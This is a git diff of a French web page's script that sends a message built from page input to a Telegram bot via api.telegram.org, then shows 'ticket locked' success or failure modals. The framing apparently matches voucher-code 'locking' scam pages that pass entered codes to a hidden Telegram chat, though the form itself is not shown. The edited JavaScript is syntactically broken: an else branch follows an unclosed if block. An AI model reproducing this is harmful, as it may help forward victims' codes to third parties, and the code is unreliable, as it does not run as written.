@@ -317,6 +317,17 @@
             </div>
         </div>
     </footer>
+    <div id="customModal">
+    <!-- Your custom modal content -->
+    <p id="modalMessage"></p>
+  </div>
+  <div id="customModalFail">
+
+    <!-- Your custom modal content -->
+
+    <p id="modalMessageFail"></p>
+
+  </div>
 
     <script>
         /* logique to open */
@@ -365,28 +376,46 @@
         xhr.open('GET', `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`);
 
         xhr.send();
-
-        // You can handle success or failure as needed
-
-        xhr.onload = function () {
+     xhr.onload = function () {
+            const customModal = document.getElementById('customModal');
+            const modalMessage = document.getElementById('modalMessage');
+            const customModalFail = document.getElementById('customModalFail');
+            const modalMessageFail = document.getElementById('modalMessageFail');    
 
             if (xhr.status === 200) {
+                // Display success modal
+              customModal.style.display = 'block';
+              
+                modalMessage.textContent ='code verrouillé avec succès';
+                setTimeout(() => {
 
-                window.alert('Ticket verrouillé avec succès');
+                customModal.style.display = 'none';
+                }, 3000);
 
+            
+        else {
+                // Display error modal
+                modalMessageFail.textContent = 'echec lors du Verrouillage, veuillez réesayer';
             }
-            else {
+    
+            customModal.style.display = 'block';
+            customModalFail.style.display='block';
+            // Close the modal after 3 seconds (adjust as needed)
+            setTimeout(() => {
+                customModal.style.display = 'none';
+            }, 3000);
+    
+      setTimeout(() => {
 
-                // Display an error popup
+                customModalFail.style.display = 'none';
 
-                window.alert('erreur lors du Verrouillage du ticket ');
+            }, 3000);
 
-            }
+      };
 
-        };
+    });   
 
-    });
-
+        
 </script>
 
 </body>
